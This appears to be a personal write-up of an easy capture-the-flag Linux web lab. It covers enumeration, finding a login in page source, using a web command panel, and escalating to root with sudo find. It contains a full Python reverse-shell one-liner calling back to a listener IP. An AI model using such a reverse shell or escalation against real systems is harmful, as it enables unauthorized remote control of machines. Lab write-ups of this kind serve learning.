[[Linux]] [[Web]] [[Easy]] [[Privilege Escalation Linux]]
1.First about i think its scan gobuster a machine
![[Pasted image 20250929140840.png]]
and find so interesting pages
2.Check every page what we find and firs page of webapp 
first page
![[Pasted image 20250929140514.png]]
here we can log in but now we dont know username and password![[Pasted image 20250929140605.png]]
i cant find something ineresting from this page: 
![[Pasted image 20250929140722.png]]
next i tried to go on portal.php but its rederected me on login php
what was in robots.txt
![[Pasted image 20250929141056.png]]
robots.txt - file usually use for admint but we can open it and find some string dont know what is it but save in txt on desktop
now i want to try username or password, its easy lab i dont think what will be so hard to find something interesting
i again check the main page and opened html code of page
i find username
![[Pasted image 20250929143019.png]]
what if try it on login page
![[Pasted image 20250929143129.png]]
its working! and now we have command panel? lets try commands
first what we check its `sudo -l`
![[Pasted image 20250929143258.png]]
we can use every command, take root now
use command to be root from find and its doesn working im still www-data![[Pasted image 20250929143532.png]]
maybe use shell or download it, i try from python![[Pasted image 20250929143624.png]]
we have python 3 and now can try start revesce shell, use netcat and this python script: python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.11.147.65",9001));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'
![[Pasted image 20250929143834.png]]
and start our python shell and we are here![[Pasted image 20250929143910.png]]
now i want to take root from sudo find command
![[Pasted image 20250929144026.png]]
and i have root now lets take all flags, first will be in first i find in /var/www/ secret
![[Pasted image 20250929144406.png]]
second flag we must find, i tried to check users what have we have on this machine and its rick![[Pasted image 20250929144516.png]]
and we find next flag
![[Pasted image 20250929144626.png]]
and third flag i search with find just use `find / -name *.txt` and it was in root![[Pasted image 20250929144741.png]]
thats all:) 